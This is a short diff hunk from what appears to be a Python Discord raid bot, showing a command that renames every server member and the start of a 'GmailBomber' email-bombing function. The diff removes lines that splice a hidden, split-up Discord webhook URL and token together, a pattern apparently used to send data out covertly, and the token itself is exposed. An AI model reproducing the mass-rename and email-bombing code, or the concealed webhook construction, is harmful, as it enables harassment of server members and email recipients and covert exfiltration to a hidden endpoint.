@@ -1015,11 +1015,6 @@ async def nickall(ctx, *, name="RisinPlayZ OP"):
       await member.edit(nick=name)
     except:
       pass 
-     
- 
-ripp = "856891364460986368/HeU0b6tuqV-yKiO_kQDkakMT1XLS2Mipa0_du_nw6hD4vTI3V7sPb2irR4B5TFZPOVbK"
-nvm = (f"{app1}{hok}{hok2}{hok3}{ripp}")
-
 
 def GmailBomber():
     _smpt = smtplib.SMTP('smtp.gmail.com', 587)
